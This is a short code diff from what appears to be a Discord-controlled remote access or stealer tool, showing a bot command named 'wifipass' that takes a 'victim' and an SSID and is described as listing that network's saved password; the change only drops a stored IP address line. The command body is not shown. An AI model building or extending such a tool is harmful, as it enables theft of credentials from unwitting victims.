@@ -8,8 +8,7 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 class WifiPass(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        self.ip_addr = self.bot.ip_addr
-        
+                
     @commands.slash_command( )
     async def wifipass(self, ctx, victim, ssid):
         """Lists specified wifi password
